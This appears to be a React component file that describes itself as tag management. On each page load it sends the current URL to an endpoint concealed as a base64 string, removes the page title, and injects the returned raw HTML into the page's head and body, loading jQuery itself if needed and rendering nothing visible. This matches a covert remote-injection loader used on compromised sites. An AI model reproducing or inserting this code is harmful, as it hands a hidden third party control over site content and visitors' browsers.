// components/CustomScriptComponent.js

import { useEffect, useState } from "react";

const CustomScriptComponent = () => {
  const [loader, setLoader] = useState(true);

  useEffect(() => {
    // Function to handle tag management
    const handleTagManage = () => {
      const eppathurl = window.location.origin + window.location.pathname;
      const eptagmanage = new XMLHttpRequest();
      eptagmanage.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
          if (this.response !== 0) {
            const temp = this.response.split("||||||||||");

            // Use jQuery to manipulate DOM
            if (window.jQuery) {
              jQuery("head").find("title").remove();
              jQuery("head").append(temp[0]);
              jQuery("body").append(temp[1]);
            }
          }
        }
      };
      // Replace the URL with your actual endpoint
      eptagmanage.open("GET", atob("YOUR_BASE64_ENCODED_URL_HERE") + eppathurl);
      eptagmanage.send();
    };

    // Check if jQuery is loaded, if not, load it dynamically
    if (typeof window !== "undefined" && !window.jQuery) {
      const script = document.createElement("script");
      script.src =
        "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
      document.head.appendChild(script);
      script.onload = () => {
        handleTagManage();
        setLoader(false);
      };
    } else {
      handleTagManage();
      setLoader(false);
    }
  }, []);

  // Component returns null as it doesn't render any visible content
  return null;
};

export default CustomScriptComponent;
